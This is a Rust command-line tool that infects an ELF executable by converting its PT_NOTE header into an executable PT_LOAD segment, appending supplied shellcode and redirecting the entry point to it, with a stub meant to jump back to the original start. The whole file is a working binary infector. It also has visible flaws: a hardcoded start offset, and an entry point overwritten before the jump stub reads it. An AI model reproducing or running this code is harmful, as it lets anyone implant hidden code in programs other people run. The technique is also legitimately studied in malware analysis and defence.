use mental_elf::elf64::constants::*;
use std::{env, fs, process};
use std::io::prelude::*;
use std::io::SeekFrom;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    if args.len() != 3 {
        eprintln!("Usage: {} <ELF File> <Shellcode File>", args[0]);
        process::exit(1);
    }

    let elf_path = &args[1];
    let sc_path = &args[2];

    // Open target ELF file with RW permissions
    let mut elf_fd = fs::OpenOptions::new()
        .read(true)
        .write(true)
        .open(&elf_path)?;

    // Load shellcode from file
    let mut shellcode: Vec<u8> = fs::read(&sc_path)?;

    // Parse ELF and program headers
    let mut elf_header = mental_elf::read_elf64_header(&mut elf_fd)?;
    let mut program_headers = mental_elf::read_elf64_program_headers(
        &mut elf_fd, 
        elf_header.e_phoff, 
        elf_header.e_phnum,
    )?;

    // Calculate offsets used to patch the ELF and program headers
    let sc_len = shellcode.len() as u64;
    let file_offset = elf_fd.metadata()?.len();
    let memory_offset = 0xc00000000 + file_offset;

    // Look for a PT_NOTE section
    for phdr in &mut program_headers {
        if phdr.p_type == PT_NOTE {
            // Convert to a PT_LOAD section with values to load shellcode
            println!("Found PT_NOTE section; converting to PT_LOAD");
            phdr.p_type = PT_LOAD;
            phdr.p_flags = PF_R | PF_X;
            phdr.p_offset = file_offset;
            phdr.p_vaddr = memory_offset;
            phdr.p_memsz += sc_len as u64;
            phdr.p_filesz += sc_len as u64;
            // Patch the ELF header to start at the shellcode
            elf_header.e_entry = memory_offset;
            break;
        }
    }

    // Patch the shellcode to jump to the original entry point after finishing
    let start_offset = 0x7490; // This should be parsed by mental_elf
    patch_jump(&mut shellcode, elf_header.e_entry, start_offset);

    // Append the shellcode to the very end of the target ELF
    elf_fd.seek(SeekFrom::End(0))?;
    elf_fd.write(&shellcode)?;

    // Commit changes to the program and ELF headers
    mental_elf::write_elf64_program_headers(
        &mut elf_fd, 
        elf_header.e_phoff,
        elf_header.e_phnum,
        program_headers,
    )?;
    mental_elf::write_elf64_header(&mut elf_fd, elf_header)?;

    Ok(())
}

/// Patches in shellcode to resolve _start and jump there
fn patch_jump(shellcode: &mut Vec<u8>, entry_point: u64, start_offset: u64) {
    use byteorder::{ByteOrder, LittleEndian as le};
    let mut jump_shellcode = include_bytes!("../files/jump_to_start.o").clone();
    le::write_u64(&mut jump_shellcode[0x07..], shellcode.len() as u64);
    le::write_u64(&mut jump_shellcode[0x11..], entry_point);
    le::write_u64(&mut jump_shellcode[0x1b..], start_offset);
    shellcode.extend_from_slice(&jump_shellcode);
}